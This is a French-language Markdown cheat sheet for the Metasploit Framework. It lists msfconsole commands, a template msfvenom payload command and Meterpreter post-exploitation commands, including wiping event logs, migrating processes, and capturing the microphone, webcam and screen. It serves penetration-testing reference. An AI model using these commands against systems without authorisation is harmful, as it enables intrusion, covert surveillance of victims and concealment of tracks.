
# 🛠️ Metasploit Complete Cheat Sheet

> ✅ Ta référence rapide pour maîtriser Metasploit Framework.

## ⚡ Lancer Metasploit
```bash
msfconsole
```

## 🧭 Commandes de base

| Commande     | Description                           |
|--------------|---------------------------------------|
| help / ?    | Affiche l’aide de msfconsole         |
| banner      | Affiche une nouvelle bannière        |
| version     | Affiche la version de Metasploit     |
| exit / quit | Quitter Metasploit                   |
| clear       | Nettoyer le terminal                 |

## 🔍 Rechercher des modules
```bash
search [mot-clé]
```

## 📦 Utiliser un module
```bash
use [chemin_du_module]
```

## 📝 Infos sur un module
```bash
info [chemin_du_module]
```

## ⚙️ Configurer les options

| Commande                | Description                           |
|-------------------------|---------------------------------------|
| show options           | Affiche les options du module        |
| set [option] [valeur]  | Définit une option                   |
| setg [option] [valeur] | Définit une option globale           |
| unset [option]         | Supprimer la valeur d’une option     |
| unsetg [option]        | Supprimer une option globale         |

## 🔎 Afficher les modules

| Commande        | Description                     |
|-----------------|---------------------------------|
| show exploits  | Affiche les exploits disponibles|
| show payloads  | Affiche les payloads disponibles|
| show auxiliary | Affiche les modules auxiliaires|
| show encoders  | Affiche les encoders           |
| show nops      | Affiche les générateurs de NOP |
| show post      | Affiche les modules post-exploit|

## 💥 Lancer un exploit
```bash
exploit
```
ou
```bash
run
```

## 🎯 Gestion des sessions

| Commande           | Description                      |
|--------------------|----------------------------------|
| sessions          | Liste toutes les sessions       |
| sessions -i [ID]  | Interagir avec une session      |
| sessions -k [ID]  | Terminer une session            |
| background        | Mettre une session en arrière-plan|

## 🛠️ Générer un payload avec msfvenom
```bash
msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [fichier]
```

## 🔄 Mettre à jour Metasploit
```bash
msfupdate
```

## 🚀 Astuces utiles

| Commande                | Description                          |
|-------------------------|--------------------------------------|
| jobs                   | Liste les jobs actifs               |
| kill [ID]              | Arrête un job                       |
| resource [fichier.rc]  | Exécute un script automatique       |

## 🧩 Modules auxiliaires
```bash
use auxiliary/scanner/portscan/tcp
```

## 🧬 Encoders
```bash
set ENCODER x86/shikata_ga_nai
```

## 🛡️ NOPs
```bash
set NOP generator x86/opty2
```

## 🧰 Meterpreter

### Commandes système
| Commande   | Description                                   |
|------------|-----------------------------------------------|
| execute    | Exécute une commande sur la cible             |
| kill [PID] | Termine un processus sur la cible             |
| reboot     | Redémarre la machine cible                    |
| shutdown   | Éteint la machine cible                       |
| clearev    | Efface les journaux d'événements              |

### Commandes de fichiers
| Commande   | Description                               |
|------------|-------------------------------------------|
| pwd        | Affiche le répertoire courant             |
| ls         | Liste les fichiers et dossiers            |
| cd [dir]   | Change de répertoire                      |
| cat [file] | Affiche le contenu d'un fichier           |
| download [file] | Télécharge un fichier depuis la cible |
| upload [file]   | Envoie un fichier vers la cible       |
| edit [file]     | Édite un fichier sur la cible         |
| rm [file]       | Supprime un fichier sur la cible      |

### Commandes réseau
| Commande   | Description                                   |
|------------|-----------------------------------------------|
| ipconfig   | Affiche les interfaces réseau de la cible     |
| portfwd    | Configure un port forwarding                  |
| route      | Affiche ou modifie la table de routage        |
| arp        | Affiche la table ARP de la cible              |
| netstat    | Affiche les connexions réseau actives         |

### Commandes diverses
| Commande       | Description                                   |
|----------------|-----------------------------------------------|
| sysinfo       | Affiche les infos système de la cible         |
| getuid        | Affiche l'utilisateur actuel                  |
| getpid        | Affiche le PID actuel                         |
| ps            | Liste les processus                           |
| shell         | Ouvre un shell classique                      |
| migrate [PID] | Migre vers un autre processus                 |
| screenshot    | Prend une capture d'écran                     |
| record_mic    | Enregistre le micro                           |
| webcam_list   | Liste les webcams                             |
| webcam_snap   | Prend une photo depuis la webcam              |

